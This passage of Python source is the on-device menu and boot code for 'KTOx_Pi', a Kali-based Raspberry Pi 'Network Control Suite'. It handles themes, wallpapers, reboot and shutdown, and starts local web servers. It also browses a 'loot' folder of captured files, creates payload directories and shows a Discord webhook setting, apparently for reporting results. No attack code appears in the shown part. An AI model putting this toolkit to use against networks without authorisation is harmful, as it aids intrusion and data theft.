                " Wallpaper",
                " Return to Default",
            ]
            choice = GetMenuString(menu, title="UI Theme")
            if not choice:
                return
            s = choice.strip()
            if s == "Theme Presets":
                self._theme_presets_menu()
            elif s == "User Themes":
                self._user_themes_menu()
            elif s == "Custom Colors":
                self._custom_color_picker_menu()
            elif s == "Save as User Theme":
                self._save_as_user_theme()
            elif s == "View Mode":
                self._view_mode_menu()
            elif s == "Wallpaper":
                self._wallpaper_menu()
            elif s == "Return to Default":
                if YNDialog("RESET THEME", y="Yes", n="No",
                           b="Reset to\nKTOx_Pi\nClassic?"):
                    color.apply_theme("ktox_red", persist=True)
                    Dialog_info("Reset to\ndefault.", wait=False, timeout=1)

    def _theme_presets_menu(self):
        keys = list(UI_THEMES.keys())
        labels = []
        for key in keys:
            mark = "✔" if key == color.current_theme else " "
            labels.append(f" {mark} {UI_THEMES[key]['label']}")
        sel = GetMenuString(labels, duplicates=True, title="Theme Presets")
        if not sel:
            return
        idx, _ = sel
        chosen = keys[idx]
        if color.apply_theme(chosen, persist=True):
            Dialog_info(f"Theme:\n{UI_THEMES[chosen]['label']}",
                       wait=False, timeout=1)
        else:
            Dialog_info("Theme apply\nfailed.", wait=True)

    def _view_mode_menu(self):
        """Switch between 8 different view modes."""
        global _view_mode
        modes = ["list", "grid", "carousel", "panel", "table", "paged", "thumbnail", "vcarousel"]
        mode_names = {
            "list": "List",
            "grid": "Grid",
            "carousel": "Carousel",
            "panel": "Panel",
            "table": "Table",
            "paged": "Paged",
            "thumbnail": "Thumbnail",
            "vcarousel": "V-Carousel"
        }
        labels = []
        for mode in modes:
            mark = "✔" if mode == _view_mode else " "
            labels.append(f" {mark} {mode_names[mode]}")
        sel = GetMenuString(labels, duplicates=True, title="View Mode")
        if not sel:
            return
        idx, _ = sel
        _view_mode = modes[idx]
        self._save_view_mode(_view_mode)
        Dialog_info(f"View Mode:\n{mode_names[_view_mode]}",
                   wait=False, timeout=1)

    def _save_view_mode(self, mode: str):
        """Persist view mode to config file."""
        try:
            path = default.config_file
            try:
                data = json.loads(Path(path).read_text())
            except Exception:
                data = {}
            data.setdefault("UI", {})["VIEW_MODE"] = mode
            Path(path).write_text(json.dumps(data, indent=2))
        except Exception as e:
            print(f"[UI] save view mode failed: {e}")

    def _wallpaper_menu(self):
        """Select wallpaper from wallpaper directory."""
        menu_items = [" No Wallpaper"]
        wallpaper_files = []

        # Scan wallpaper directory for image files
        wp_dir = Path(WALLPAPER_DIR)
        if wp_dir.exists():
            for ext in ['*.bmp', '*.png', '*.jpg', '*.jpeg', '*.gif']:
                for img_file in sorted(wp_dir.glob(ext.lower())):
                    label = f" ⭐ {img_file.name}" if img_file.name == "ktox_logo.bmp" else f" {img_file.name}"
                    menu_items.append(label)
                    wallpaper_files.append(str(img_file))
                for img_file in sorted(wp_dir.glob(ext.upper())):
                    if img_file not in wallpaper_files:
                        label = f" ⭐ {img_file.name}" if img_file.name == "ktox_logo.bmp" else f" {img_file.name}"
                        menu_items.append(label)
                        wallpaper_files.append(str(img_file))

        sel = GetMenuString(menu_items, duplicates=True, title="Wallpaper")
        if not sel:
            return

        idx, _ = sel

        if idx == 0 and "No Wallpaper" in menu_items[0]:
            # Clear wallpaper
            global _wallpaper_image, _wallpaper_path
            _wallpaper_image = None
            _wallpaper_path = None
            self._save_wallpaper(None)
            Dialog_info("Wallpaper\nremoved.", wait=False, timeout=1)
        elif wallpaper_files and idx < len(wallpaper_files):
            # Load selected wallpaper
            wp_path = wallpaper_files[idx] if idx < len(wallpaper_files) else wallpaper_files[0]
            if _load_wallpaper(wp_path):
                self._save_wallpaper(wp_path)
                Dialog_info("Wallpaper\nloaded.", wait=False, timeout=1)
            else:
                Dialog_info("Failed to\nload image.", wait=True)

    def _save_wallpaper(self, path: str):
        """Persist wallpaper path to config file."""
        try:
            config_path = default.config_file
            try:
                data = json.loads(Path(config_path).read_text())
            except Exception:
                data = {}
            if path:
                data.setdefault("UI", {})["WALLPAPER"] = path
            else:
                data.setdefault("UI", {}).pop("WALLPAPER", None)
            Path(config_path).write_text(json.dumps(data, indent=2))
        except Exception as e:
            print(f"[UI] save wallpaper failed: {e}")

    def _pick_color(self, initial: str, title: str):
        """Interactive RGB color picker. Returns hex string or None."""
        if not (isinstance(initial, str) and initial.startswith("#") and len(initial) == 7):
            initial = "#00E5FF"
        try:
            rgb = [int(initial[1:3], 16), int(initial[3:5], 16), int(initial[5:7], 16)]
        except Exception:
            rgb = [0, 229, 255]
        chan = 0
        while True:
            with draw_lock:
                _draw_toolbar()
                color.DrawMenuBackground()
                color.DrawBorder()
                draw.rectangle([3, 13, 125, 24], fill=color.title_bg)
                _centered(_truncate(title, 108), 13, font=small_font, fill=color.border)
                draw.line([(3, 24), (125, 24)], fill=color.border, width=1)

                preview = f"#{rgb[0]:02X}{rgb[1]:02X}{rgb[2]:02X}"
                draw.rectangle([8, 30, 120, 52], fill=preview, outline=color.border, width=2)

                draw.text((10, 56), f"R:{rgb[0]:3d}", font=text_font,
                         fill=color.selected_text if chan == 0 else color.text)
                draw.text((10, 70), f"G:{rgb[1]:3d}", font=text_font,
                         fill=color.selected_text if chan == 1 else color.text)
                draw.text((10, 84), f"B:{rgb[2]:3d}", font=text_font,
                         fill=color.selected_text if chan == 2 else color.text)

                draw.text((10, 101), "L/R=chan  U/D=±5", font=small_font, fill=color.text)
                draw.text((10, 112), "K1/K3=±1  OK=save", font=small_font, fill=color.text)

            btn = getButton(timeout=0.5)
            if btn is None:
                continue
            if btn == "KEY_LEFT_PIN":
                chan = (chan - 1) % 3
            elif btn == "KEY_RIGHT_PIN":
                chan = (chan + 1) % 3
            elif btn == "KEY_UP_PIN":
                rgb[chan] = min(255, rgb[chan] + 5)
            elif btn == "KEY_DOWN_PIN":
                rgb[chan] = max(0, rgb[chan] - 5)
            elif btn == "KEY1_PIN":
                rgb[chan] = min(255, rgb[chan] + 1)
            elif btn == "KEY3_PIN":
                rgb[chan] = max(0, rgb[chan] - 1)
            elif btn == "KEY_PRESS_PIN":
                return f"#{rgb[0]:02X}{rgb[1]:02X}{rgb[2]:02X}"
            elif btn in ("KEY2_PIN", "KEY_LEFT_PIN") and chan == 0:
                return None

    def _get_text_input(self, title="Enter Text", max_len=20, initial=""):
        """Interactive text input using DarkSecKeyboard."""
        if not HAS_HW or not LCD or not GPIO:
            return None

        try:
            from payloads._darksec_keyboard import DarkSecKeyboard

            # Map our PINS format to DarkSecKeyboard format
            kb_pins = {
                "UP": PINS["KEY_UP_PIN"],
                "DOWN": PINS["KEY_DOWN_PIN"],
                "LEFT": PINS["KEY_LEFT_PIN"],
                "RIGHT": PINS["KEY_RIGHT_PIN"],
                "OK": PINS["KEY_PRESS_PIN"],
                "KEY1": PINS["KEY1_PIN"],
                "KEY2": PINS["KEY2_PIN"],
                "KEY3": PINS["KEY3_PIN"],
            }

            # Freeze background display threads while keyboard runs
            screen_lock.set()
            try:
                kb = DarkSecKeyboard(
                    width=128,
                    height=128,
                    lcd=LCD,
                    gpio_pins=kb_pins,
                    gpio_module=GPIO
                )
                result = kb.run()
                return result
            finally:
                # Resume background threads
                screen_lock.clear()
        except Exception as e:
            print(f"[UI] text input failed: {e}")
            return None

    def _custom_color_picker_menu(self):
        """Menu to pick custom colors for each field and persist."""
        color_fields = [
            ("BORDER", "Border Color"),
            ("BACKGROUND", "Background"),
            ("TEXT", "Text Color"),
            ("SELECTED_TEXT", "Selected Text"),
            ("SELECTED_TEXT_BACKGROUND", "Selection BG"),
            ("TITLE_BG", "Title Background"),
            ("PANEL_BG", "Panel Background"),
            ("GAMEPAD", "Gamepad Color"),
            ("GAMEPAD_FILL", "Gamepad Fill"),
            ("TOPBAR_BG", "Topbar Background"),
            ("TOPBAR_TEXT", "Topbar Text"),
            ("TOPBAR_ACCENT", "Topbar Accent"),
        ]

        custom_colors = {
            "BORDER": color.border,
            "BACKGROUND": color.background,
            "TEXT": color.text,
            "SELECTED_TEXT": color.selected_text,
            "SELECTED_TEXT_BACKGROUND": color.select,
            "TITLE_BG": color.title_bg,
            "PANEL_BG": color.panel_bg,
            "GAMEPAD": color.gamepad,
            "GAMEPAD_FILL": color.gamepad_fill,
            "TOPBAR_BG": color.topbar_bg,
            "TOPBAR_TEXT": color.topbar_text,
            "TOPBAR_ACCENT": color.topbar_accent,
        }

        while True:
            items = [f" {label}: {custom_colors[key]}" for key, label in color_fields]
            items += [" Save & Apply"]
            items += [" Back"]

            sel = GetMenuString(items, duplicates=True, title="Custom Colors")
            if not sel:
                return

            idx, _ = sel
            if idx == len(color_fields):
                self._apply_custom_colors(custom_colors)
                Dialog_info("Colors saved\nand applied.", wait=False, timeout=1)
                return
            elif idx == len(color_fields) + 1:
                return

            key, label = color_fields[idx]
            picked = self._pick_color(custom_colors[key], label)
            if picked:
                custom_colors[key] = picked

    def _apply_custom_colors(self, colors: dict):
        """Apply and persist custom colors."""
        color.border = colors["BORDER"]
        color.background = colors["BACKGROUND"]
        color.text = colors["TEXT"]
        color.selected_text = colors["SELECTED_TEXT"]
        color.select = colors["SELECTED_TEXT_BACKGROUND"]
        color.title_bg = colors["TITLE_BG"]
        color.panel_bg = colors["PANEL_BG"]
        color.gamepad = colors["GAMEPAD"]
        color.gamepad_fill = colors["GAMEPAD_FILL"]
        color.topbar_bg = colors["TOPBAR_BG"]
        color.topbar_text = colors["TOPBAR_TEXT"]
        color.topbar_accent = colors["TOPBAR_ACCENT"]
        color.current_theme = "custom"

        try:
            path = default.config_file
            try:
                data = json.loads(Path(path).read_text())
            except Exception:
                data = {}
            data.setdefault("UI", {})["THEME"] = "custom"
            data["COLORS"] = colors
            Path(path).write_text(json.dumps(data, indent=2))
        except Exception as e:
            print(f"[UI] save custom colors failed: {e}")

    def _save_as_user_theme(self):
        """Save current colors as a new user theme with custom name."""
        theme_name = self._get_text_input("Theme Name:", max_len=15)
        if not theme_name:
            Dialog_info("Cancelled.", wait=False, timeout=1)
            return

        colors = {
            "BORDER": color.border,
            "BACKGROUND": color.background,
            "TEXT": color.text,
            "SELECTED_TEXT": color.selected_text,
            "SELECTED_TEXT_BACKGROUND": color.select,
            "TITLE_BG": color.title_bg,
            "PANEL_BG": color.panel_bg,
            "GAMEPAD": color.gamepad,
            "GAMEPAD_FILL": color.gamepad_fill,
            "TOPBAR_BG": color.topbar_bg,
            "TOPBAR_TEXT": color.topbar_text,
            "TOPBAR_ACCENT": color.topbar_accent,
        }

        try:
            path = default.config_file
            try:
                data = json.loads(Path(path).read_text())
            except Exception:
                data = {}
            data.setdefault("USER_THEMES", {})[theme_name] = colors
            Path(path).write_text(json.dumps(data, indent=2))
            Dialog_info(f"Theme saved:\n{theme_name}", wait=False, timeout=1)
        except Exception as e:
            Dialog_info("Save failed.", wait=True)
            print(f"[UI] save user theme failed: {e}")

    def _load_user_themes(self) -> dict:
        """Load user-defined themes from config. Returns {name: colors_dict}."""
        try:
            data = json.loads(Path(default.config_file).read_text())
            return data.get("USER_THEMES", {})
        except Exception:
            return {}

    def _user_themes_menu(self):
        """Browse and apply user-defined themes."""
        user_themes = self._load_user_themes()
        if not user_themes:
            Dialog_info("No user themes.", wait=True)
            return

        while True:
            keys = list(user_themes.keys())
            labels = []
            for key in keys:
                mark = "✔" if key == color.current_theme else " "
                labels.append(f" {mark} {key}")
            labels.append(" Delete Theme")
            labels.append(" Back")

            sel = GetMenuString(labels, duplicates=True, title="User Themes")
            if not sel:
                return

            idx, _ = sel
            if idx >= len(keys):
                if idx == len(keys):
                    if YNDialog("Delete", y="Yes", n="No", b="Delete theme?"):
                        sel_name = GetMenuString([f" {k}" for k in keys], title="Delete which?")
                        if sel_name:
                            theme_to_delete = sel_name.strip()
                            self._delete_user_theme(theme_to_delete)
                        continue
                else:
                    return
            else:
                chosen = keys[idx]
                if self._apply_user_theme(chosen, user_themes[chosen]):
                    Dialog_info(f"Theme:\n{chosen}", wait=False, timeout=1)
                else:
                    Dialog_info("Theme apply\nfailed.", wait=True)

    def _apply_user_theme(self, name: str, colors: dict) -> bool:
        """Apply a user theme by name and persist selection."""
        try:
            color.border = colors.get("BORDER", color.border)
            color.background = colors.get("BACKGROUND", color.background)
            color.text = colors.get("TEXT", color.text)
            color.selected_text = colors.get("SELECTED_TEXT", color.selected_text)
            color.select = colors.get("SELECTED_TEXT_BACKGROUND", color.select)
            color.title_bg = colors.get("TITLE_BG", color.title_bg)
            color.panel_bg = colors.get("PANEL_BG", color.panel_bg)
            color.gamepad = colors.get("GAMEPAD", color.gamepad)
            color.gamepad_fill = colors.get("GAMEPAD_FILL", color.gamepad_fill)
            color.topbar_bg = colors.get("TOPBAR_BG", color.topbar_bg)
            color.topbar_text = colors.get("TOPBAR_TEXT", color.topbar_text)
            color.topbar_accent = colors.get("TOPBAR_ACCENT", color.topbar_accent)
            color.current_theme = name
            _save_ui_theme(name)
            return True
        except Exception as e:
            print(f"[UI] apply user theme failed: {e}")
            return False

    def _delete_user_theme(self, name: str):
        """Delete a user theme from config."""
        try:
            path = default.config_file
            try:
                data = json.loads(Path(path).read_text())
            except Exception:
                data = {}
            if name in data.get("USER_THEMES", {}):
                del data["USER_THEMES"][name]
                Path(path).write_text(json.dumps(data, indent=2))
                Dialog_info(f"Deleted:\n{name}", wait=False, timeout=1)
            else:
                Dialog_info("Theme not found.", wait=True)
        except Exception as e:
            Dialog_info("Delete failed.", wait=True)
            print(f"[UI] delete user theme failed: {e}")

    def _discord_status(self):
        wh = Path(INSTALL_PATH+"discord_webhook.txt")
        if wh.exists() and wh.stat().st_size > 10:
            url   = wh.read_text().strip()
            short = url[:28]+"…" if len(url)>28 else url
            lines = [" Discord webhook:", f" {short}"]
        else:
            lines = [" Discord: not set.",
                     " Edit:", " discord_webhook.txt"]
        GetMenu(lines)

    def _reboot(self):
        if YNDialog("REBOOT", y="Yes", n="No", b="Reboot device?"):
            Dialog_info("Rebooting…", wait=False, timeout=2)
            os.system("reboot")

    def _shutdown(self):
        if YNDialog("SHUTDOWN", y="Yes", n="No", b="Shut down?"):
            Dialog_info("Shutting down…", wait=False, timeout=2)
            os.system("sync && poweroff")

    def _browse_loot(self):
        try:
            files = sorted(Path(LOOT_DIR).rglob("*"),
                           key=lambda f: f.stat().st_mtime, reverse=True)
            files = [f for f in files if f.is_file()]
        except Exception:
            files = []
        if not files:
            Dialog_info("No loot yet!", wait=True)
            return
        items = [f" {f.name[:22]}" for f in files[:30]]
        sel   = GetMenu(items)
        if not sel: return
        fname = sel.strip()
        match = [f for f in files if f.name == fname]
        if not match: return
        try:
            lines = match[0].read_text(errors="ignore").splitlines()
            GetMenu([f" {l[:24]}" for l in lines[:60]])
        except Exception:
            Dialog_info("Can't read file.", wait=True)


# ── Singleton ──────────────────────────────────────────────────────────────────
m = KTOxMenu()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Boot splash ────────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def show_splash():
    """Boot splash — shown after logo BMP."""
    with draw_lock:
        draw.rectangle([(0,0),(128,128)], fill="#000000")
        # Top and bottom blood-red bars
        draw.rectangle([(0,0),(128,4)],     fill=color.border)
        draw.rectangle([(0,124),(128,128)], fill=color.border)
        # Side accent lines
        draw.rectangle([(0,0),(2,128)],     fill="#3a0000")
        draw.rectangle([(126,0),(128,128)], fill="#3a0000")
        # Title
        _centered("▐ KTOx_Pi ▌",  10, fill=color.border)
        # Divider
        draw.line([(8,22),(120,22)], fill="#3a0000", width=1)
        # Subtitle
        _centered("Network Control", 26, fill=color.selected_text)
        _centered("Suite",           40, fill=color.selected_text)
        # Divider
        draw.line([(8,52),(120,52)], fill="#3a0000", width=1)
        # Hardware
        _centered("Pi Zero 2W",      58, fill=color.text)
        _centered("Kali ARM64",      70, fill=color.text)
        # Version
        _centered(f"v{VERSION}",     84, fill=color.border)
        # Bottom tagline
        draw.line([(8,96),(120,96)],  fill="#3a0000", width=1)
        _centered("authorized",     102, fill="#6b1a1a")
        _centered("eyes only",      114, fill="#6b1a1a")
    time.sleep(1)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Boot sequence ──────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def boot():
    os.makedirs(LOOT_DIR,   exist_ok=True)
    os.makedirs(PAYLOAD_DIR, exist_ok=True)

    # Symlink /root/KTOx/loot → KTOx loot for payload compatibility
    rj_dir  = "/root/KTOx"
    rj_loot = rj_dir + "/loot"
    os.makedirs(rj_dir, exist_ok=True)
    if not os.path.exists(rj_loot):
        try: os.symlink(LOOT_DIR, rj_loot)
        except OSError: pass

    _hw_init()

    show_splash()

    # Start refresh and web servers in parallel — don't block boot
    threading.Thread(target=refresh_state, daemon=True).start()

    for script in ("device_server.py", "web_server.py"):
        spath = Path(INSTALL_PATH + script)
        if spath.exists():
            try:
                subprocess.Popen(
                    ["python3", str(spath)],
                    cwd=INSTALL_PATH,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            except Exception:
                pass

    with draw_lock:
        draw.rectangle([(0,0),(128,128)], fill="#000000")
        draw.rectangle([(0,0),(128,4)],   fill=color.border)
        draw.rectangle([(0,124),(128,128)], fill=color.border)
        _centered("▐ KTOx_Pi ▌", 10, fill=color.border)
        draw.line([(8,22),(120,22)], fill="#3a0000", width=1)
        _centered("Starting…",    34, fill=color.text)
        _centered("WebUI  :8080", 52, fill="#3a0000")
        _centered("WS     :8765", 64, fill="#3a0000")

    with draw_lock:
        draw.rectangle([(0,0),(128,128)], fill="#000000")
        draw.rectangle([(0,0),(128,4)],     fill=color.border)
        draw.rectangle([(0,124),(128,128)], fill=color.border)
        _centered("▐ KTOx_Pi ▌",  10, fill=color.border)
        draw.line([(8,22),(120,22)], fill="#3a0000", width=1)
        _centered("READY",          34, fill="#2ecc71")
        draw.line([(8,46),(120,46)], fill="#3a0000", width=1)
        _centered(f"IP: {get_ip()}", 52, fill=color.selected_text)
        _centered(f"IF: {ktox_state['iface']}", 64, fill=color.selected_text)
        draw.line([(8,76),(120,76)], fill="#3a0000", width=1)
        _centered("WebUI :8080",    82, fill=color.text)
        _centered("WS    :8765",    94, fill=color.text)
        draw.line([(8,106),(120,106)], fill="#3a0000", width=1)
        _centered("authorized",    112, fill="#6b1a1a")
    time.sleep(2)

    with draw_lock:
        draw.rectangle([(0,0),(128,128)], fill=color.background)
        color.DrawBorder()

    start_background_loops()
    print(f"[KTOx] Boot OK — IP={get_ip()} IF={ktox_state['iface']}")
    m.home_loop()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Entry point ────────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _sig(sig, frame):
    _stop_evt.set()
    if HAS_HW:
        try: GPIO.cleanup()
        except Exception: pass
    if HAS_KEYBOARD:
        try: keyboard_input.stop()
        except Exception: pass
    sys.exit(0)


if __name__ == "__main__":
    if HAS_HW and os.geteuid() != 0:
        print("Must run as root"); sys.exit(1)
    signal.signal(signal.SIGINT,  _sig)
    signal.signal(signal.SIGTERM, _sig)
    try:
        boot()
    except Exception as e:
        print(f"[KTOx] Fatal: {e}")
        import traceback; traceback.print_exc()
        print("[KTOx] Headless fallback — access via http://<ip>:8080")
        try:
            while True: time.sleep(60)
        except KeyboardInterrupt:
            pass
